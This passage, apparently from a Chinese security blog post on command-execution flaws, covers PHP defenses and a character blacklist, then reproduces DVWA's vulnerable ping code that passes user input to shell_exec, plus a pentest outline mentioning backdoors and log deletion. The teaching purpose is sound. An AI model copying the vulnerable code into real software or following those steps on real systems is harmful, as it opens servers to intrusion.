class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$validIP</span> = <span class="hljs-title function_ invoke__">validateIP</span>(<span class="hljs-variable">$target</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$validIP</span>) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$validIP</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid IP address&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="2-特殊字符过滤"><a href="#2-特殊字符过滤" class="headerlink" title="2. 特殊字符过滤"></a>2. 特殊字符过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterDangerousChars</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 过滤危险字符</span><br>    <span class="hljs-variable">$dangerous</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$dangerous</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="使用安全的API"><a href="#使用安全的API" class="headerlink" title="使用安全的API"></a>使用安全的API</h3><h4 id="避免直接调用系统命令"><a href="#避免直接调用系统命令" class="headerlink" title="避免直接调用系统命令"></a>避免直接调用系统命令</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 不安全的方式</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br><br><span class="hljs-comment">// 安全的方式：使用专门的函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">securePing</span>(<span class="hljs-params"><span class="hljs-variable">$ip</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class="hljs-comment">// 使用socket或其他安全方式实现ping功能</span><br>        <span class="hljs-comment">// 而不是直接调用系统命令</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><ol>
+<li><strong>最小权限原则</strong>：Web应用程序应该以最小权限用户运行</li>
+<li><strong>禁用危险函数</strong>：在php.ini中禁用<code>exec</code>, <code>shell_exec</code>, <code>system</code>等函数</li>
+<li><strong>沙箱环境</strong>：将Web应用程序运行在受限的环境中</li>
+</ol>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>定期进行代码安全审计，重点关注：</p>
+<ul>
+<li>用户输入处理</li>
+<li>系统命令调用</li>
+<li>文件操作</li>
+<li>数据库查询</li>
+</ul>
+<hr>
+<h2 id="📊-安全等级分析"><a href="#📊-安全等级分析" class="headerlink" title="📊 安全等级分析"></a>📊 安全等级分析</h2><h3 id="DVWA各安全等级的防护机制"><a href="#DVWA各安全等级的防护机制" class="headerlink" title="DVWA各安全等级的防护机制"></a>DVWA各安全等级的防护机制</h3><h4 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 完全没有过滤</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 简单的黑名单过滤</span><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;&amp;&amp;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$target</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 更严格的过滤</span><br><span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]);<br><span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>);<br><span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$substitutions</span>), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span> . <span class="hljs-variable">$target</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="🎓-学习要点"><a href="#🎓-学习要点" class="headerlink" title="🎓 学习要点"></a>🎓 学习要点</h2><h3 id="关键知识点总结"><a href="#关键知识点总结" class="headerlink" title="关键知识点总结"></a>关键知识点总结</h3><ol>
+<li><strong>漏洞成因</strong>：缺乏输入验证和输出过滤</li>
+<li><strong>利用方法</strong>：命令连接符、特殊字符绕过</li>
+<li><strong>危害程度</strong>：服务器完全控制、数据泄露</li>
+<li><strong>防护策略</strong>：输入验证、权限控制、安全编码</li>
+</ol>
+<h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><ol>
+<li><strong>信息收集</strong>：确定目标和攻击面</li>
+<li><strong>漏洞发现</strong>：寻找命令执行点</li>
+<li><strong>漏洞验证</strong>：确认漏洞存在</li>
+<li><strong>漏洞利用</strong>：获取系统权限</li>
+<li><strong>权限维持</strong>：上传后门、建立持久连接</li>
+<li><strong>痕迹清理</strong>：删除日志、恢复系统状态</li>
+</ol>
+<hr>
+<h2 id="⚠️-免责声明"><a href="#⚠️-免责声明" class="headerlink" title="⚠️ 免责声明"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="category-chain-item">漏洞利用</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="print-no-link">#漏洞利用</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行漏洞</div>
+      <div>https://bae-ace.github.io/2025/07/26/命令执行漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bae</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/" title="Struts2-045远程代码执行漏洞复现与原理分析">
+                        <span class="hidden-mobile">Struts2-045远程代码执行漏洞复现与原理分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"CHbSLmwKFof8sHkOvlnoDfza-MdYXbMMI","appKey":"lVqIfnWUAiZZLIag2RoSpxoo","serverURLs":"https://chbslmwk.api.lncldglobal.com","placeholder":"留言仅限讨论，禁止广告等行为","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://bae-ace.github.io" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://bae-ace.github.io/" target="_blank" rel="nofollow noopener"><span>bae</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxingxing.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
